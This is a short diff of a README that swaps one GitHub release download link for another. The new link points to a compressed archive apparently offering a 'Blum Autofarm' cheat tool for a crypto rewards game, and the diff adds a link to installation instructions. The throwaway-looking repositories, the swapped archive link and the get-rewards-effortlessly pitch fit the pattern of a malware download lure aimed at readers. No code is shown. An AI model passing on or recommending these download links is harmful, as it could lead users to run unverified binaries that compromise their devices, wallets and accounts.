@@ -1,4 +1,5 @@
-# [DOWNLOAD](https://github.com/bakedayk8/bakedayk8/releases/download/Basked-GameZ-21z/Github.Softwares.v1.0.2.7z)
+# [DOWNLOAD](https://github.com/tiverrubix/Blum-New-Autofarming-Method/releases/download/Download/Blum_Aurtofarm_x64_x86.7z)
+# [Click here to view installation instructions](https://github.com/tiverrubix/Blum-New-Autofarming-Method/blob/main/Installation%20instructions.txt)
 
 
 ### Blum Rewards Genie: Effortless Rewards for Your Blum Adventures 💰✨
